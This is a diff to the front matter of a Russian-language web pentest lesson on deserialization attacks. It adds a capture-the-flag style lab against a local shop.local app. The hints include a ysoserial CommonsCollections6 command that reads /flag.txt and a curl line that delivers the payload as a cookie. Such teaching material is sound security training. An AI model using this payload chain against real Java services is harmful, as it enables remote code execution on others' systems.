@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 8
 summary: "Экспертный уровень: Java gadget-цепочки, .NET ViewState и трюки PHP."
+lab:
+  kind: shell
+  title: "Практика: Java-десериализация — цепочка CommonsCollections"
+  toolset: [core, curl, unzip, ysoserial.jar]
+  workdir: /home/student/task
+  files: [task.md, session.b64, shop.war]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "base64 -d session.b64 | xxd -l 8 покажет aced 0005 — это Java Serialization."
+    - "unzip -l shop.war перечислит библиотеки: нужна уязвимая commons-collections-3.2.1.jar."
+    - "URLDNS — безопасный детектор (только DNS), RCE-цепочка — CommonsCollections6."
+    - "ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.b64, затем curl -s -b @payload.b64 https://shop.local/ > found.txt."
 ---
 
 ## Задача
